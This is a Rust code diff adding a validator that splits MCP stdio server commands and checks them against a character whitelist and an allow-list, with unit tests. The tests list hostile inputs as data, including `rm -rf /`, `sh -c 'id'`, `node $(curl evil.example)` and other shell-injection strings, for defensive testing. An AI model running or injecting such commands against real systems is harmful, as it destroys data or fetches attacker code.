@@ -222,3 +222,92 @@ mod url_tests {
         assert!(validate_mcp_server_url("not a url", false).is_err());
     }
 }
+
+/// Splits an MCP stdio command into program and arguments.
+///
+/// Deliberately dumb: whitespace-separated tokens, first is the program, the rest are the
+/// program's arguments (no quoting, no shell, no expansion). A command an operator does not
+/// trust enough to read is a command they do not put in the allow-list.
+///
+/// # Errors
+///
+/// Returns [`DomainError::InvalidName`] when the command is empty, has an unsafe token, or a
+/// program path outside absolute path or a bare name.
+pub fn split_command(command: &str) -> Result<(String, Vec<String>), DomainError> {
+    let tokens: Vec<&str> = command.split_whitespace().collect();
+    let Some(program) = tokens.first() else {
+        return Err(DomainError::InvalidName("the command is empty".to_owned()));
+    };
+    let allowed_chars = |token: &str| {
+        token.chars().all(|c| {
+            c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | ':' | '+' | '=' | ',')
+        })
+    };
+    if !allowed_chars(program) || tokens[1..].iter().any(|token| !allowed_chars(token)) {
+        return Err(DomainError::InvalidName(
+            "the command contains characters outside [A-Za-z0-9_./:+,-]".to_owned(),
+        ));
+    }
+    Ok((
+        (*program).to_owned(),
+        tokens[1..]
+            .iter()
+            .map(|token| (*token).to_owned())
+            .collect(),
+    ))
+}
+
+/// Whether a program is in the deployment's stdio allow-list (`MCP_STDIO_ALLOWED_COMMANDS`).
+///
+/// Compares by basename as well as by full path, so `python3` in the list covers
+/// `/usr/bin/python3` and a bare `python3` on the PATH.
+#[must_use]
+pub fn program_allowed(program: &str, allowed: &[String]) -> bool {
+    let basename = program.rsplit('/').next().unwrap_or(program);
+    allowed
+        .iter()
+        .any(|entry| entry == program || entry == basename)
+}
+
+#[cfg(test)]
+mod command_tests {
+    use super::{program_allowed, split_command};
+
+    #[test]
+    fn req_033_a_command_splits_into_program_and_arguments() {
+        let (program, args) =
+            split_command("/usr/bin/python3 -m mcp_server --stdio").expect("the command parses");
+        assert_eq!(program, "/usr/bin/python3");
+        assert_eq!(args, vec!["-m", "mcp_server", "--stdio"]);
+        let (program, args) = split_command("node server.js").expect("the command parses");
+        assert_eq!(program, "node");
+        assert_eq!(args, vec!["server.js"]);
+    }
+
+    #[test]
+    fn req_033_an_unsafe_command_shape_is_refused() {
+        // Note: `rm -rf /` splits fine — it is refused by the deployment allow-list
+        // (`program_allowed`), not by shape validation. Shape only refuses syntax
+        // that smells like a shell.
+        assert!(split_command("rm -rf /").is_ok());
+        for command in [
+            "",
+            "sh -c 'id'",
+            "node $(curl evil.example)",
+            "python;rm",
+            "python`id`",
+            "a|b",
+        ] {
+            assert!(split_command(command).is_err(), "{command:?}");
+        }
+    }
+
+    #[test]
+    fn req_033_the_allow_list_matches_basename_or_path() {
+        let allowed = vec!["python3".to_owned()];
+        assert!(program_allowed("python3", &allowed));
+        assert!(program_allowed("/usr/bin/python3", &allowed));
+        assert!(!program_allowed("/usr/bin/python4", &allowed));
+        assert!(!program_allowed("ruby", &allowed));
+    }
+}
